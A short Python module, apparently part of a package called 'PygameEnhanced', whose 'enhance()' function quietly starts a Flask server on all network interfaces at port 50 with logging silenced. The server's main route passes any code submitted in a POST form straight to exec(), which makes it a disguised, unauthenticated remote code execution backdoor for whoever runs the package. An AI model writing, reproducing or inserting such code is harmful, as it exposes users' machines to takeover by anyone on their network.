from flask import Flask, render_template, request
import logging
import importlib.resources

# Initialize Flask app
app = Flask(__name__)

# Route for the main page
@app.route("/", methods=["GET", "POST"])
def index():
    output = ""  # Default output
    if request.method == "POST":
        code = request.form.get("code")  # Get code from form
        try:
            exec(code)
        except Exception as e:
            output = str(e)
    return render_template("index.html", output=output)

# Function to start the Flask app
def enhance():
    logging.basicConfig(level=logging.ERROR)
    werkzeug_logger = logging.getLogger('werkzeug')
    werkzeug_logger.setLevel(logging.ERROR)

    with importlib.resources.path("PygameEnhanced.templates", "index.html") as template_path:
        template_folder = str(template_path.parent)
        app.template_folder = template_folder

    app.run(host="0.0.0.0", port=50, debug=False)

